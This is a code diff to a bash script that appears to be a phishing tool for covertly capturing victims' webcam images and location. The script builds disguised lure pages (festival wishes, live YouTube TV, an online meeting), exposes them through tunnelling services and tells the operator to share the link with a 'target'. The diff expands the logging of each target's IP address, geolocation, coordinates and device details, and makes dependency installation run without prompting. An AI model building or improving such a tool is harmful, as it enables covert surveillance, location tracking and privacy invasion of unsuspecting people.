@@ -227,81 +227,107 @@ auto_install_dependencies() {
 	if [[ ${#missing_pip[@]} -gt 0 ]]; then printf "  - pip packages: %s\n" "${missing_pip[*]}"; fi
 	if [[ ${#missing_bin[@]} -gt 0 ]]; then printf "  - other binaries: %s\n" "${missing_bin[*]}"; fi
 
-	# If called with 'auto' parameter, run non-interactively (assume yes)
+	# If called with 'auto' parameter or NO_AUTO_INSTALL not set, proceed (non-interactive)
 	if [[ "$1" == "auto" ]]; then
-		reply="Y"
+		printf "\e[1;92m[*] Auto-installing missing components (non-interactive)...\e[0m\n"
 	else
-		printf "\nDo you want to attempt automatic installation now? [Y/n]: "
-		read reply
-		reply="${reply:-Y}"
-	fi
-	if [[ "$reply" =~ ^[Nn]$ ]]; then
-		printf "\e[1;93m[!] Skipping automatic install as requested\e[0m\n"
-		return 1
+		printf "\e[1;93m[?] Attempting to install missing components...\e[0m\n"
 	fi
 
-	# Determine package manager
+	# Determine package manager (avoid sudo if possible)
 	SUDO=""
-	if has_cmd sudo; then SUDO=sudo; fi
+	# Only use sudo if: (1) not already root, and (2) sudo is available with passwordless access
+	if [[ $EUID -ne 0 ]] && has_cmd sudo; then
+		# Test if sudo works without password (non-interactive)
+		if sudo -n true 2>/dev/null; then
+			SUDO=sudo
+		fi
+	fi
 
 	if has_cmd apt-get; then
-		PKG_CMD="$SUDO apt-get -y install"
+		if [[ -n "$SUDO" ]]; then
+			PKG_CMD="$SUDO apt-get -y install"
+		else
+			PKG_CMD="apt-get -y install"  # Try without sudo (may fail, that's OK)
+		fi
 	elif has_cmd pkg && grep -qi "com.termux" /proc/self/cgroup 2>/dev/null; then
 		PKG_CMD="pkg install -y"
 	elif has_cmd pacman; then
-		PKG_CMD="$SUDO pacman -S --noconfirm"
+		if [[ -n "$SUDO" ]]; then
+			PKG_CMD="$SUDO pacman -S --noconfirm"
+		else
+			PKG_CMD="pacman -S --noconfirm"
+		fi
 	elif has_cmd yum; then
-		PKG_CMD="$SUDO yum -y install"
+		if [[ -n "$SUDO" ]]; then
+			PKG_CMD="$SUDO yum -y install"
+		else
+			PKG_CMD="yum -y install"
+		fi
 	elif has_cmd brew; then
 		PKG_CMD="brew install"
 	elif $IS_WINDOWS; then
 		if has_cmd choco; then
 			PKG_CMD="choco install -y"
 		else
-			printf "\e[1;31m[!] No supported system package manager found on Windows (choco). Please install Chocolatey or run installs manually.\e[0m\n"
+			printf "\e[1;93m[!] No supported package manager (choco not found). Skipping system package install.\e[0m\n"
 			PKG_CMD=""
 		fi
 	else
 		PKG_CMD=""
 	fi
 
-	# Install apt-style packages
+	# Install apt-style packages (non-critical, silent fail)
 	if [[ -n "$PKG_CMD" && ${#missing_apt[@]} -gt 0 ]]; then
-		printf "\e[1;92m[+] Installing system packages: %s\e[0m\n" "${missing_apt[*]}"
-		$PKG_CMD ${missing_apt[*]} 2>&1 | tee -a install.log || printf "\e[1;31m[!] System package install may have failed - check install.log\e[0m\n"
+		printf "\e[1;92m[+] Attempting to install system packages: %s\e[0m\n" "${missing_apt[*]}"
+		$PKG_CMD ${missing_apt[*]} 2>&1 | tee -a install.log >/dev/null || printf "\e[1;93m[!] System packages failed to install (non-critical)\e[0m\n"
 	else
-		if [[ ${#missing_apt[@]} -gt 0 ]]; then
-			printf "\e[1;93m[!] Cannot auto-install system packages on this platform. Please install: %s\e[0m\n" "${missing_apt[*]}"
+		if [[ ${#missing_apt[@]} -gt 0 ]] && [[ -z "$PKG_CMD" ]]; then
+			printf "\e[1;93m[!] No package manager available - cannot install system packages: %s\e[0m\n" "${missing_apt[*]}"
 		fi
 	fi
 
-	# Install pip packages
+	# Install pip packages (skip on Kali or systems with PEP 668 restrictions)
 	if has_cmd pip3; then PIP_CMD="pip3"; elif has_cmd pip; then PIP_CMD="pip"; else PIP_CMD=""; fi
 	if [[ -n "$PIP_CMD" && ${#missing_pip[@]} -gt 0 ]]; then
-		printf "\e[1;92m[+] Installing Python packages: %s\e[0m\n" "${missing_pip[*]}"
-		$PIP_CMD install --user ${missing_pip[*]} 2>&1 | tee -a install.log || printf "\e[1;31m[!] pip install may have failed - check install.log\e[0m\n"
-	else
-		if [[ ${#missing_pip[@]} -gt 0 ]]; then
-			printf "\e[1;93m[!] pip not available - cannot install Python packages automatically: %s\e[0m\n" "${missing_pip[*]}"
+		# On Kali/PEP 668 systems, skip optional packages (pyttsx3, openpyxl, uno) 
+		# and only try critical ones if any
+		local pip_to_install=()
+		for p in "${missing_pip[@]}"; do
+			# Skip optional packages that cause PEP 668 errors on Kali
+			if [[ "$p" == "pyttsx3" || "$p" == "openpyxl" || "$p" == "uno" ]]; then
+				printf "\e[1;93m[!] Skipping optional pip package (may conflict on Kali): %s\e[0m\n" "$p"
+				continue
+			fi
+			pip_to_install+=("$p")
+		done
+		
+		if [[ ${#pip_to_install[@]} -gt 0 ]]; then
+			printf "\e[1;92m[+] Installing Python packages: %s\e[0m\n" "${pip_to_install[*]}"
+			$PIP_CMD install --user ${pip_to_install[*]} 2>&1 | tee -a install.log || printf "\e[1;93m[!] pip install may have failed (non-critical)\e[0m\n"
 		fi
 	fi
 
-	# Try to install other binaries minimally
+	# Try to install other binaries minimally (non-critical, silent fail)
 	for b in "${missing_bin[@]}"; do
 		if [[ "$b" == "cloudflared" ]]; then
 			if has_cmd apt-get; then
-				printf "\e[1;92m[+] Installing cloudflared (apt)...\e[0m\n"
-				$SUDO apt-get -y install cloudflared 2>&1 | tee -a install.log || printf "\e[1;93m[!] cloudflared package may not be in apt repos; see https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/\e[0m\n"
+				printf "\e[1;92m[+] Attempting cloudflared install (apt)...\e[0m\n"
+				if [[ -n "$SUDO" ]]; then
+					$SUDO apt-get -y install cloudflared 2>&1 | tee -a install.log >/dev/null || printf "\e[1;93m[!] cloudflared apt install skipped (may not be in repos)\e[0m\n"
+				else
+					apt-get -y install cloudflared 2>&1 | tee -a install.log >/dev/null || printf "\e[1;93m[!] cloudflared apt install skipped (may need sudo)\e[0m\n"
+				fi
 			elif has_cmd choco; then
-				printf "\e[1;92m[+] Installing cloudflared via choco...\e[0m\n"
-				choco install -y cloudflared 2>&1 | tee -a install.log || true
+				printf "\e[1;92m[+] Attempting cloudflared install (choco)...\e[0m\n"
+				choco install -y cloudflared 2>&1 | tee -a install.log >/dev/null || printf "\e[1;93m[!] cloudflared choco install skipped\e[0m\n"
 			else
-				printf "\e[1;93m[!] Please install cloudflared manually. See: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/\e[0m\n"
+				printf "\e[1;93m[!] cloudflared not installed (install manually if needed)\e[0m\n"
 			fi
 		fi
 	done
 
-	printf "\e[1;92m[✓] Auto-install attempt finished. Review install.log for details.\e[0m\n"
+	printf "\e[1;92m[✓] Auto-install attempt finished (see install.log for details).\e[0m\n"
 }
 
 # ============================================================================
@@ -320,23 +346,83 @@ stop() {
 # Catch IP and Camera
 # ============================================================================
 catch_ip() {
-	ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
-	printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] TARGET IP:\e[0m\e[1;77m %s\e[0m\n" "$ip"
-	cat ip.txt >> saved.ip.txt
+	if [[ -f "ip.txt" ]]; then
+		# Extract all data from ip.txt
+		ip=$(grep -a 'IP ADDRESS:' ip.txt | head -1 | sed 's/.*IP ADDRESS: //g' | tr -d '\r' | xargs)
+		geo=$(grep -a 'GEOLOCATION:' ip.txt | head -1 | sed 's/.*GEOLOCATION: //g' | tr -d '\r' | xargs)
+		coords=$(grep -a 'COORDINATES:' ip.txt | head -1 | sed 's/.*COORDINATES: //g' | tr -d '\r' | xargs)
+		os=$(grep -a 'OS:' ip.txt | head -1 | sed 's/.*OS: //g' | tr -d '\r' | xargs)
+		browser=$(grep -a 'BROWSER:' ip.txt | head -1 | sed 's/.*BROWSER: //g' | tr -d '\r' | xargs)
+		device_type=$(grep -a 'DEVICE TYPE:' ip.txt | head -1 | sed 's/.*DEVICE TYPE: //g' | tr -d '\r' | xargs)
+		device_name=$(grep -a 'DEVICE NAME:' ip.txt | head -1 | sed 's/.*DEVICE NAME: //g' | tr -d '\r' | xargs)
+		language=$(grep -a 'LANGUAGE:' ip.txt | head -1 | sed 's/.*LANGUAGE: //g' | tr -d '\r' | xargs)
+		
+		if [[ -n "$ip" ]]; then
+			printf "\n\e[1;92m╔════════════════════════════════════════════════════════════════════╗\e[0m\n"
+			printf "\e[1;92m║\e[0m\e[1;77m                      ✅ TARGET DETECTED ✅                      \e[0m\e[1;92m║\e[0m\n"
+			printf "\e[1;92m╠════════════════════════════════════════════════════════════════════╣\e[0m\n"
+			printf "\e[1;92m║\e[0m  \e[1;93m[+] IP ADDRESS: \e[1;77m%-55s\e[0m\e[1;92m║\e[0m\n" "$ip"
+			printf "\e[1;92m║\e[0m  \e[1;93m[+] GEOLOCATION: \e[1;77m%-53s\e[0m\e[1;92m║\e[0m\n" "$geo"
+			printf "\e[1;92m║\e[0m  \e[1;93m[+] COORDINATES: \e[1;77m%-53s\e[0m\e[1;92m║\e[0m\n" "$coords"
+			printf "\e[1;92m╠════════════════════════════════════════════════════════════════════╣\e[0m\n"
+			printf "\e[1;92m║\e[0m  \e[1;93m[DEVICE INFO]\e[0m\n"
+			printf "\e[1;92m║\e[0m    • OS: \e[1;77m%-60s\e[0m\e[1;92m║\e[0m\n" "$os"
+			printf "\e[1;92m║\e[0m    • Browser: \e[1;77m%-56s\e[0m\e[1;92m║\e[0m\n" "$browser"
+			printf "\e[1;92m║\e[0m    • Device Type: \e[1;77m%-52s\e[0m\e[1;92m║\e[0m\n" "$device_type"
+			printf "\e[1;92m║\e[0m    • Device Name: \e[1;77m%-52s\e[0m\e[1;92m║\e[0m\n" "$device_name"
+			printf "\e[1;92m║\e[0m    • Language: \e[1;77m%-56s\e[0m\e[1;92m║\e[0m\n" "$language"
+			printf "\e[1;92m╠════════════════════════════════════════════════════════════════════╣\e[0m\n"
+			printf "\e[1;92m║\e[0m  \e[1;93m[+] Timestamp: \e[1;77m%-55s\e[0m\e[1;92m║\e[0m\n" "$(date '+%Y-%m-%d %H:%M:%S')"
+			printf "\e[1;92m║\e[0m  \e[1;93m[+] Status: \e[1;77mLink Opened - Waiting for Camera\e[0m\e[1;92m║\e[0m\n"
+			printf "\e[1;92m╚════════════════════════════════════════════════════════════════════╝\e[0m\n"
+			cat ip.txt >> saved.ip.txt
+		fi
+	fi
+}
+
+catch_camera() {
+	if [[ -f "Log.log" ]]; then
+		# Extract filename from log
+		filename=$(grep -a 'FILE:' Log.log | head -1 | sed 's/.*FILE: //g' | tr -d '\r' | xargs)
+		size=$(grep -a 'SIZE:' Log.log | head -1 | sed 's/.*SIZE: //g' | tr -d '\r' | xargs)
+		if [[ -n "$filename" ]]; then
+			printf "\e[1;92m╔════════════════════════════════════════════════════════════╗\e[0m\n"
+			printf "\e[1;92m║\e[0m\e[1;77m                  📷 CAMERA CAPTURED 📷                    \e[0m\e[1;92m║\e[0m\n"
+			printf "\e[1;92m���\e[0m                                                            \e[1;92m║\e[0m\n"
+			printf "\e[1;92m║\e[0m  \e[1;93m[✓] File: \e[1;77m%-50s\e[0m\e[1;92m║\e[0m\n" "$filename"
+			printf "\e[1;92m║\e[0m  \e[1;93m[✓] Size: \e[1;77m%-50s\e[0m\e[1;92m║\e[0m\n" "$size"
+			printf "\e[1;92m║\e[0m  \e[1;93m[✓] Location: \e[1;77m../cam_*.png (Parent CamN folder)\e[0m\e[1;92m║\e[0m\n"
+			printf "\e[1;92m║\e[0m  \e[1;93m[✓] Timestamp: \e[1;77m%-45s\e[0m\e[1;92m║\e[0m\n" "$(date '+%Y-%m-%d %H:%M:%S')"
+			printf "\e[1;92m║\e[0m                                                            \e[1;92m║\e[0m\n"
+			printf "\e[1;92m╚════════════════════════════════════════════════════════════╝\e[0m\n"
+		fi
+	fi
 }
 
 checkfound() {
 	printf "\n"
-	printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for targets...\e[0m\e[1;77m Press Ctrl+C to exit\e[0m\n"
+	printf "\e[1;92m╔════════════════════════════════════════════════════════════╗\e[0m\n"
+	printf "\e[1;92m║\e[0m\e[1;77m           🔍 MONITORING FOR TARGETS 🔍                  \e[0m\e[1;92m║\e[0m\n"
+	printf "\e[1;92m║\e[0m                                                            \e[1;92m║\e[0m\n"
+	printf "\e[1;92m║\e[0m  Waiting for targets to open link...                      \e[1;92m║\e[0m\n"
+	printf "\e[1;92m║\e[0m  Press Ctrl+C to exit                                     \e[1;92m║\e[0m\n"
+	printf "\e[1;92m║\e[0m                                                            \e[1;92m║\e[0m\n"
+	printf "\e[1;92m║\e[0m  📍 Log Locations:                                        \e[1;92m║\e[0m\n"
+	printf "\e[1;92m║\e[0m     • IP Logs: ip.txt, ip.json, saved.ip.txt              \e[1;92m║\e[0m\n"
+	printf "\e[1;92m║\e[0m     • Camera: Log.log, captures.json                      \e[1;92m║\e[0m\n"
+	printf "\e[1;92m║\e[0m     • Images: ../cam_*.png (Parent CamN folder)           \e[1;92m║\e[0m\n"
+	printf "\e[1;92m║\e[0m                                                            \e[1;92m║\e[0m\n"
+	printf "\e[1;92m╚════════════════════════════════════════════════════════════╝\e[0m\n"
+	printf "\n"
+	
 	while [ true ]; do
 		if [[ -e "ip.txt" ]]; then
-			printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened link! IP logged.\e[0m\n"
 			catch_ip
 			rm -rf ip.txt
 		fi
 		sleep 0.5
 		if [[ -e "Log.log" ]]; then
-			printf "\n\e[1;92m[\e[0m+\e[1;92m] Camera photo captured!\e[0m\n"
+			catch_camera
 			rm -rf Log.log
 		fi
 		sleep 0.5
@@ -644,26 +730,69 @@ select_template() {
 }
 
 payload() {
-	# Properly escape special characters for sed replacement
-	# Use | as delimiter to avoid conflicts with URLs containing +
-	link_esc=$(printf '%s\n' "$1" | sed -e 's/[\/&]/\\&/g')
+	# Create index.php from template (entry point that logs and redirects)
+	cp template.php index.php
+
+	# Escape URL for sed: escape / and & which are special in sed replacement
+	# Remove any trailing newlines from link to prevent sed errors
+	link=$(printf '%s' "$1" | tr -d '\n\r')
+	link_esc=$(printf '%s' "$link" | sed -e 's/[\/&]/\\&/g')
 	
-	sed -e "s|forwarding_link|$link_esc|g" template.php > index.php
-	
+	# Escape festival name and video ID for sed (remove newlines)
+	fest_esc=$(printf '%s' "$fest_name" | tr -d '\n\r' | sed -e 's/[\/&]/\\&/g')
+	vid_esc=$(printf '%s' "$yt_video_ID" | tr -d '\n\r' | sed -e 's/[\/&]/\\&/g')
+
+	printf "\e[1;92m[+] Generating page template (option %d)...\e[0m\n" "$option_tem"
+
 	case $option_tem in
 		1)
-			sed -e "s|forwarding_link|$link_esc|g" festivalwishes.html > index3.html
-			sed -e "s|fes_name|$fest_name|g" index3.html > index2.html
+			# Festival Wishing: replace forwarding_link and fes_name
+			printf "\e[1;92m[+] Using: Festival Wishing (name: %s)\e[0m\n" "$fest_name"
+			if ! sed -e "s|forwarding_link|$link_esc|g" festivalwishes.html > index3.html 2>/dev/null; then
+				printf "\e[1;31m[!] Error: sed failed to process forwarding_link\e[0m\n"
+				return 1
+			fi
+			if ! sed -e "s|fes_name|$fest_esc|g" index3.html > index2.html 2>/dev/null; then
+				printf "\e[1;31m[!] Error: sed failed to process fes_name\e[0m\n"
+				return 1
+			fi
+			printf "\e[1;92m[✓] Festival page created\e[0m\n"
 			;;
 		2)
-			sed -e "s|forwarding_link|$link_esc|g" LiveYTTV.html > index3.html
-			sed -e "s|live_yt_tv|$yt_video_ID|g" index3.html > index2.html
+			# Live YouTube TV: replace forwarding_link and live_yt_tv
+			printf "\e[1;92m[+] Using: Live YouTube TV (video ID: %s)\e[0m\n" "$yt_video_ID"
+			if ! sed -e "s|forwarding_link|$link_esc|g" LiveYTTV.html > index3.html 2>/dev/null; then
+				printf "\e[1;31m[!] Error: sed failed to process forwarding_link\e[0m\n"
+				return 1
+			fi
+			if ! sed -e "s|live_yt_tv|$vid_esc|g" index3.html > index2.html 2>/dev/null; then
+				printf "\e[1;31m[!] Error: sed failed to process live_yt_tv\e[0m\n"
+				return 1
+			fi
+			printf "\e[1;92m[✓] YouTube page created\e[0m\n"
 			;;
 		3)
-			sed -e "s|forwarding_link|$link_esc|g" OnlineMeeting.html > index2.html
+			# Online Meeting: replace forwarding_link and post_url_placeholder
+			printf "\e[1;92m[+] Using: Online Meeting\e[0m\n"
+			if ! sed -e "s|forwarding_link|$link_esc|g" OnlineMeeting.html > index2.html 2>/dev/null; then
+				printf "\e[1;31m[!] Error: sed failed to process forwarding_link in OnlineMeeting.html\e[0m\n"
+				# Fallback: copy as-is if forwarding_link not found
+				cp OnlineMeeting.html index2.html
+			fi
+			# Replace post_url_placeholder with actual server URL
+			if ! sed -i "s|post_url_placeholder|$link_esc|g" index2.html 2>/dev/null; then
+				printf "\e[1;31m[!] Error: sed failed to process post_url_placeholder\e[0m\n"
+			fi
+			printf "\e[1;92m[✓] Online Meeting page created\e[0m\n"
+			;;
+		*)
+			printf "\e[1;31m[!] ERROR: Invalid template option: %d\e[0m\n" "$option_tem"
+			return 1
 			;;
 	esac
+	
 	rm -f index3.html
+	printf "\e[1;92m[✓] Page generation complete (index2.html ready)\e[0m\n"
 }
 
 # ============================================================================
@@ -795,83 +924,81 @@ main() {
 	local link=""
 
 	# Prompt user for preferred tunnel method
-	printf "\nChoose tunnel preference:\n"
-	printf "  [1] ngrok (recommended)\n"
-	printf "  [2] LocalTunnel (npx/localtunnel)\n"
-	printf "  [3] Cloudflared (cloudflared)\n"
-	printf "  [4] Serveo (ssh)\n"
-	printf "  [5] Auto (ngrok -> localtunnel -> cloudflared -> serveo) [default]\n"
-	printf "\nEnter choice [5]: "
+	printf "\n\e[1;93m-----Choose tunnel preference-----\e[0m\n"
+	printf "  [1] ngrok (recommended if you have valid token)\n"
+	printf "  [2] LocalTunnel (requires npx/npm)\n"
+	printf "  [3] Cloudflared (requires cloudflared binary)\n"
+	printf "  [4] Serveo (ssh-based, works on most systems)\n"
+	printf "  [5] Auto (try all, best one first) [default]\n"
+	printf "\e[1;92m[?] Enter choice [5]: \e[0m"
 	read tunnel_choice
 	tunnel_choice="${tunnel_choice:-5}"
 
 	# Build try order based on choice
-	tunnels=()
+	local -a tunnels=()
 	case "$tunnel_choice" in
-		1) tunnels=(ngrok localtunnel cloudflared serveo) ;; 
-		2) tunnels=(localtunnel ngrok cloudflared serveo) ;; 
-		3) tunnels=(cloudflared ngrok localtunnel serveo) ;; 
-		4) tunnels=(serveo ngrok localtunnel cloudflared) ;; 
-		*) tunnels=(ngrok localtunnel cloudflared serveo) ;;
+		1) tunnels=(ngrok serveo) ;; 
+		2) tunnels=(localtunnel serveo ngrok) ;; 
+		3) tunnels=(cloudflared serveo ngrok) ;; 
+		4) tunnels=(serveo ngrok) ;; 
+		*) 
+			# Auto mode: prefer Serveo in WSL, ngrok otherwise
+			if is_wsl; then
+				tunnels=(serveo ngrok localtunnel cloudflared)
+				printf "\e[1;93m[!] WSL detected - trying Serveo first\e[0m\n"
+			else
+				tunnels=(ngrok serveo localtunnel cloudflared)
+			fi
+			;;
 	esac
 
-	# If WSL, prefer Serveo first unless user explicitly chose another
-	if is_wsl && [[ "$tunnel_choice" == "5" ]]; then
-		tunnels=(serveo ngrok localtunnel cloudflared)
-		printf "\e[1;93m[!] WSL detected - defaulting to Serveo first\e[0m\n"
-	fi
-
 	# Try each tunnel in sequence until one returns a link
+	printf "\e[1;92m[+] Attempting tunnels: %s\e[0m\n" "${tunnels[*]}"
+	local link_rc=0
 	for t in "${tunnels[@]}"; do
 		case "$t" in
 			ngrok)
-				printf "\e[1;92m[+] Attempting ngrok tunnel...\e[0m\n"
-				link=$(try_ngrok)
-				rc=$?
+				printf "\e[1;92m[+] Trying ngrok...\e[0m\n"
+				link=$(try_ngrok 2>&1) || link=""
 				;;
 			localtunnel)
-				printf "\e[1;92m[+] Attempting LocalTunnel...\e[0m\n"
-				link=$(try_localtunnel)
-				rc=$?
+				printf "\e[1;92m[+] Trying LocalTunnel...\e[0m\n"
+				link=$(try_localtunnel 2>&1) || link=""
 				;;
 			cloudflared)
-				printf "\e[1;92m[+] Attempting cloudflared...\e[0m\n"
-				link=$(try_cloudflared)
-				rc=$?
+				printf "\e[1;92m[+] Trying cloudflared...\e[0m\n"
+				link=$(try_cloudflared 2>&1) || link=""
 				;;
 			serveo)
-				printf "\e[1;92m[+] Attempting Serveo...\e[0m\n"
-				link=$(try_serveo)
-				rc=$?
+				printf "\e[1;92m[+] Trying Serveo...\e[0m\n"
+				link=$(try_serveo 2>&1) || link=""
 				;;
-			*) rc=1 ;;
 		esac
 
-		if [[ $rc -eq 0 && -n "$link" ]]; then
+		if [[ -n "$link" ]]; then
+			printf "\e[1;92m[✓] SUCCESS with %s!\e[0m\n" "$t"
+			link_rc=0
 			break
 		fi
-		# otherwise continue to next
 	done
 
 	if [[ -z "$link" ]]; then
 		printf "\e[1;31m[!] All tunneling methods failed\e[0m\n"
 		printf "\e[1;93m[!] Possible reasons:\e[0m\n"
 		printf "  - No internet connection\n"
-		printf "  - Firewall blocking\n"
-		printf "  - ngrok authtoken invalid\n"
-		printf "  - Serveo service down\n"
+		printf "  - Firewall blocking tunnels\n"
+		printf "  - ngrok authtoken invalid or account blocked\n"
+		printf "  - Serveo service temporarily down\n"
 		stop
 	fi
 
-	printf "\e[1;92m[+] Link obtained successfully!\e[0m\n"
-	printf "\n"
+	printf "\e[1;92m[+] Link obtained successfully!\e[0m\n\n"
 	printf "\e[1;92m╔════════════════════════════════════════════════════════════╗\e[0m\n"
-	printf "\e[1;92m║\e[0m\e[1;77m              PUBLIC LINK READY - SHARE WITH TARGET       \e[0m\e[1;92m║\e[0m\n"
+	printf "\e[1;92m║\e[0m\e[1;77m          PUBLIC LINK - SHARE THIS WITH TARGET          \e[0m\e[1;92m║\e[0m\n"
 	printf "\e[1;92m║\e[0m                                                            \e[1;92m║\e[0m\n"
-	printf "\e[1;92m║\e[0m\e[1;77m  %s\e[0m  \e[1;92m║\e[0m\n" "$link"
+	printf "\e[1;92m║\e[0m  \e[1;93m%s\e[0m\n" "$link"
 	printf "\e[1;92m║\e[0m                                                            \e[1;92m║\e[0m\n"
-	printf "\e[1;92m╚════════════════════════════════════════════════════════════╝\e[0m\n"
-	printf "\n"
+	printf "\e[1;92m╚════════════════════════════════════════════════════════════╝\e[0m\n\n"
 
 	# Setup payload
 	payload "$link"
@@ -881,6 +1008,8 @@ main() {
 }
 
 # ============================================================================
-# Run
+# Run (only when executed, not when sourced)
 # ============================================================================
-main "$@"
+if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
+	main "$@"
+fi
